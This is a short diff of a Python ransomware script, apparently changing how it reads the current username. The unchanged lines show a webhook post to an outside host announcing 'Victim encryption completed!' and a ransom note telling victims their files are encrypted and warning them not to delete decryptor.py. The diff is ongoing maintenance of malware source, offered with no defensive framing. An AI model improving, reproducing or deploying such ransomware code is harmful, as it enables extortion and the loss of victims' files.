@@ -2,7 +2,7 @@ from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.fernet import Fernet
-import configparser, requests, os, platform, shutil, subprocess
+import configparser, requests, os, platform, shutil, subprocess, getpass
 
 
 config = configparser.ConfigParser()
@@ -109,7 +109,7 @@ if webhookbool:
         data = {"content" : "@everyone Victim encryption completed!"}
         requests.post(webhookurl, json=data)
 
-user = os.getlogin()
+user = getpass.getuser()
 txtstring = "Your files have been encrypted! To decrypt them, run the file on your desktop [decryptor.py] and follow the instructions shown! WARNING: IF YOU DELETE DECRYPTOR.PY YOUR FILES MAY NEVER BE RECOVERED"
 filename = "READ BEFORE ITS TOO LATE.txt"
 with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "decryptor.py"), "r") as f:
